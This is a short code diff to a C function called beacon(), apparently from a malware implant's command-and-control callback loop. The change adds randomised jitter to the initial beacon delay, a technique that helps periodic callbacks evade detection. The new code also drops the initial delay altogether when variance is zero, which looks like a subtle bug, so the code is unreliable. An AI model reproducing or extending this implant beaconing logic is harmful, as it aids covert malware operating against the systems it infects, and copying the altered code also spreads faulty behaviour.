@@ -135,7 +135,8 @@ void *beacon(void *param)
 	DLX(4, printf("\t%32s: %-f\n\n", "Beacon Variance (%)", beaconInfo->percentVariance));
 
 	DLX(4, printf("\nStarting beacon thread with initial beacon delay of %ld seconds\n", beaconInfo->initDelay / 1000));
-	Sleep(beaconInfo->initDelay);	// Wait for initial delay
+	if (beaconInfo->percentVariance > 0)
+		Sleep(beaconInfo->initDelay + calc_jitter(beaconInfo->initDelay, beaconInfo->percentVariance));	// Wait for initial delay + jitter
 
 	for (;;) {		// Beacon Loop
 		secondsUp = GetSystemUpTime(); // Get system uptime
